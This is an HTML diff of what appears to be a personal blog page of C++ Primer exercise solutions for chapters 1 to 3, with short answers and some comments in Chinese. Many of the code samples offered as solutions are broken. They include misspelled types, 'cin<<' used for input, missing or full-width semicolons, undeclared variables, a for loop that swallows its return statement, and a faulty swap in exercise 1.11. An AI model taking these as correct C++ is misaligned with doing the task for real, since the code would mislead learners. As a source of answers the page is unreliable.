-<p><li>What output will the following code produce?</li><br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">unsigned u=<span class="number">10</span>,u2=<span class="number">42</span>;</span><br><span class="line"><span class="symbol">std:</span><span class="symbol">:cout&lt;&lt;u2-u&lt;&lt;std</span><span class="symbol">:</span><span class="symbol">:endl</span>;  <span class="regexp">//</span><span class="number">32</span></span><br><span class="line"><span class="symbol">std:</span><span class="symbol">:cout&lt;&lt;u-u2&lt;&lt;std</span><span class="symbol">:</span><span class="symbol">:endl</span>;  <span class="regexp">//</span><span class="number">4294967264</span></span><br><span class="line">int i=<span class="number">10</span>,i2=<span class="number">42</span>;  </span><br><span class="line"><span class="symbol">std:</span><span class="symbol">:cout&lt;&lt;i2-i&lt;&lt;std</span><span class="symbol">:</span><span class="symbol">:endl</span>;  <span class="regexp">//</span><span class="number">32</span></span><br><span class="line"><span class="symbol">std:</span><span class="symbol">:cout&lt;&lt;i-i2&lt;&lt;std</span><span class="symbol">:</span><span class="symbol">:endl</span>;  <span class="regexp">//</span>-<span class="number">32</span></span><br><span class="line"><span class="symbol">std:</span><span class="symbol">:cout&lt;&lt;i-u&lt;&lt;std</span><span class="symbol">:</span><span class="symbol">:endl</span>;  <span class="regexp">//</span><span class="number">0</span></span><br><span class="line"><span class="symbol">std:</span><span class="symbol">:cout&lt;&lt;u-i&lt;&lt;std</span><span class="symbol">:</span><span class="symbol">:endl</span>; <span class="regexp">//</span><span class="number">0</span></span><br></pre></td></tr></table></figure></p>
-<p><li>2.8</li></p>
-<p><li>Using escape sequences, write a program to print 2M followed by a newline. Modify the program to print 2, then a tab, then an M, followed by a newline.</li><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;<span class="number">2</span>&lt;&lt;<span class="string">"\115\012"</span>;</span><br><span class="line">   <span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;<span class="number">2</span>&lt;&lt;<span class="string">"\t\115\012"</span>;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p><li>2.9</li></p>
-<p><li>Explain the following definitions. For those that are illegal, explain what’s wrong and how to correct it.<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(a) <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; <span class="keyword">int</span> input_value;</span><br><span class="line">(b) <span class="keyword">int</span> i = &#123; <span class="number">3.14</span> &#125;;</span><br><span class="line">(c) <span class="keyword">double</span> salary = wage = <span class="number">9999.99</span>;</span><br><span class="line">(d) <span class="keyword">int</span> i = <span class="number">3.14</span>;</span><br></pre></td></tr></table></figure></li></p>
-<p></p>
-<p><small>error:expect’(‘for funtion-style cast or type construction.</small></p><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> input_value=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cin</span>&gt;&gt;input_value;</span><br></pre></td></tr></table></figure><br><br><p><small>warning: implicit conversion from ‘double’ to ‘int’ changes value from 3.14 to 3</small></p><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">double</span> i=&#123;<span class="number">3.14</span>&#125;;</span><br></pre></td></tr></table></figure><br><br><p><small>error: use of undeclared identifier ‘wage’</small></p><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">double</span> wage;</span><br><span class="line"><span class="keyword">double</span> salary = wage = <span class="number">9999.99</span>;</span><br></pre></td></tr></table></figure><br><br><li>2.10</li><br><li>What are the initial values, if any, of each of the following variables?</li><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> global_str;</span><br><span class="line"><span class="keyword">int</span> global_int;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> local_int;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> local_str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br><p><small>global_str is global variable, so the value is empty string. global_int is global variable, so the value is zero. local_int is a local variable which is not uninitialized, so it has a undefined value. local_str is also a local variable which is not uninitialized, but it has a value that is defined by the class. So it is empty string. </small></p>
-
-<p><li>2.13</li></p>
-<p><li>What is the value of j in the following program?</li><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i = <span class="number">42</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span> i = <span class="number">100</span>;</span><br><span class="line">   <span class="keyword">int</span> j = i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p><small>j=100</small></p>
-
-<p><li>2.14</li></p>
-<p><li>Is the following program legal? If so, what values are printed?</li><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i = <span class="number">100</span>, sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i!=<span class="number">10</span>;++i)</span><br><span class="line">    &#123;sum+=i&#125;;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;i&lt;&lt;<span class="string">" "</span>&lt;&lt;sum&lt;&lt;<span class="built_in">std</span>::endl;</span><br></pre></td></tr></table></figure></p>
-<p><small>Output:100 45</small></p><br><br><br><br><br><p><small>剩下的东西明天再搞吧，今天好烦，名字换成2.1了，就这么任性的决定了。</small></p>
-
-
+        <ul>
+<li>3.1</li>
+<li><p>use using declaraton</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cin</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::endl;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">     <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">     <span class="keyword">for</span>(<span class="keyword">int</span> val = <span class="number">1</span>;val &lt;= <span class="number">10</span>;val++)</span><br><span class="line">     &#123;</span><br><span class="line">         sum+=val;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="built_in">cout</span>&lt;&lt;<span class="string">"sum="</span>&lt;&lt;sum&lt;&lt;endl;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>3.2</p>
+</li>
+<li>read the standard input a line at a time<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">string</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cin</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>:</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::endl;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::getline;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">     <span class="built_in">string</span> line;</span><br><span class="line">     <span class="keyword">while</span>(getline(<span class="built_in">cin</span>,line))&#123;</span><br><span class="line">           <span class="built_in">cout</span>&lt;&lt;line&lt;&lt;endl;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cin</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::endl;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">string</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="built_in">string</span> str;<span class="built_in">cin</span>&gt;&gt;str;<span class="built_in">cout</span>&lt;&lt;str&lt;&lt;endl)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>3.4</li>
+<li><p>read two strings and report whether the string are equll.if not,report which of two is larger.</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cin</span>:</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::endl;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">string</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">     sting str1,str2;</span><br><span class="line">     <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;str1&gt;&gt;str2)</span><br><span class="line">     &#123;</span><br><span class="line">        <span class="keyword">if</span>(str1==str2)</span><br><span class="line">          <span class="built_in">cout</span>&lt;&lt;<span class="string">"equll"</span>；</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          <span class="built_in">cout</span>&lt;&lt;<span class="string">"the larger string is"</span>&lt;&lt;((str1&gt;str2)?str1:str2)          </span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>read two string and report whether that the string has the same length,if not ,report which is longer.</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cin</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::endl;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">string</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;str1&gt;&gt;str2)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(str1.size()==str2.size())</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"equll"</span>&lt;&lt;endl;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"the longer string is"</span>&lt;&lt;((str1.size()&gt;str2.size())?str1:str2)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>3.5</p>
+</li>
+<li><p>read strings from the standard input,concatenating what is read into one large string,and print the concatenated string.</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> String_sum;</span><br><span class="line">    <span class="keyword">for</span>(<span class="built_in">string</span> buffer;<span class="built_in">cin</span>&lt;&lt;buffer;String_sum+=buffer)</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"The String_sum is"</span>&lt;&lt;String_sum&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>3.5</p>
+</li>
+<li><p>sparate adjacent input strings by a space.</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">   <span class="built_in">string</span> str;</span><br><span class="line">   <span class="keyword">for</span>(<span class="built_in">string</span> buffer;<span class="built_in">cin</span>&gt;&gt;buffer;str+=(str.empty()?<span class="string">""</span>:<span class="string">" "</span>)+buffer);</span><br><span class="line">   <span class="built_in">cout</span>&lt;&lt;<span class="string">"The sum string is"</span>&lt;&lt;str&lt;&lt;endl;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>3.6</p>
+</li>
+<li><p>use a range for to change all the characters in a string to X.</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> str;</span><br><span class="line">    <span class="built_in">cin</span>&lt;&lt;str;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;c : str) c = <span class="string">'X'</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;str&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>3.10</p>
+</li>
+<li>reads a string of characters including punctuation and writes what was read but with the punctuation removed.<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">string</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cin</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::endl;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"Enter a string of characters including punctuation."</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">string</span> s; getline(<span class="built_in">cin</span>, s); <span class="built_in">cout</span> &lt;&lt; endl)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> i : s) </span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">ispunct</span>(i)) <span class="built_in">cout</span> &lt;&lt; i;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
 
       
     </div>
@@ -697,259 +988,6 @@
       
 	<div class="article-category tagcloud">
 	<a class="article-category-link" href="/categories/编程学习/">编程学习</a>
-	</div>
-
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-2015-10-08-cppcode1" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2015/10/08/2015-10-08-cppcode1/" class="article-date">
-  	<time datetime="2015-10-08T15:23:08.000Z" itemprop="datePublished">2015-10-08</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2015/10/08/2015-10-08-cppcode1/">c++ primer 1</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <li>1.9</li><br><li>编写程序，使用while循环将50到100的整数相加。</li><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">     <span class="keyword">int</span> sum=<span class="number">0</span>,i=<span class="number">50</span>;</span><br><span class="line">     <span class="keyword">while</span>(i!=<span class="number">101</span>)</span><br><span class="line">     sum+=i++;</span><br><span class="line">     <span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;<span class="string">"sum="</span>&lt;&lt;sum&lt;&lt;<span class="built_in">std</span>::end;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br><li>1.10</li><br><li>除了++运算符将运算对象的值增加1以外，还有一个递减运算符(–)实现将值减少1.编写程序，使用递减运算符在循环中按递减顺序打印出10与0之间的整数。</li><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(val&gt;=<span class="number">0</span>)</span><br><span class="line">       <span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;val--&lt;&lt;<span class="built_in">std</span>::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br><li>1.11</li><br><li>编写程序，提示用户输入两个整数，打印出这两个整数所指定的范围内的所有整数。</li><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">      <span class="keyword">int</span> small = <span class="number">0</span>,big = <span class="number">0</span>,temp;</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;<span class="string">"enter two integers:\n"</span>;</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">cin</span>&gt;&gt;small&gt;&gt;big;</span><br><span class="line">          <span class="keyword">if</span>(small&gt;big)&#123;</span><br><span class="line">             temp=small;</span><br><span class="line">             big=temp;</span><br><span class="line">             small=big;</span><br><span class="line">          &#125;</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">int</span> curr = small;curr &lt;= big; curr++)</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;curr:</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br><li>1.16</li><br><li>编写程序，从cin中读取一组数，输出其和。</li><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> limit=<span class="number">0</span>,sum=<span class="number">0</span>,value=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;<span class="string">"How many integers would you like to enter?"</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>&gt;&gt;limit;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">std</span>::<span class="built_in">cin</span>&gt;&gt;value &amp;&amp; (--limit !=<span class="number">0</span>))</span><br><span class="line">    sum+=value;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;sum+value&lt;&lt;<span class="built_in">std</span>::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br><hr><br><li>2015年10月10日更新<br><br>&nbsp;&nbsp;&nbsp;&nbsp;根据lyeec的建议,添加了题目。</li><br><hr><br><li>2015年10月15日更新<br><br>&nbsp;&nbsp;&nbsp;&nbsp;改正了1.11的错误。</li>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C++</a></li></ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-	<a class="article-category-link" href="/categories/编程学习/">编程学习</a>
-	</div>
-
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-2015-10-04-Mac" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2015/10/04/2015-10-04-Mac/" class="article-date">
-  	<time datetime="2015-10-04T10:34:38.000Z" itemprop="datePublished">2015-10-04</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2015/10/04/2015-10-04-Mac/">重新认识Mac</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
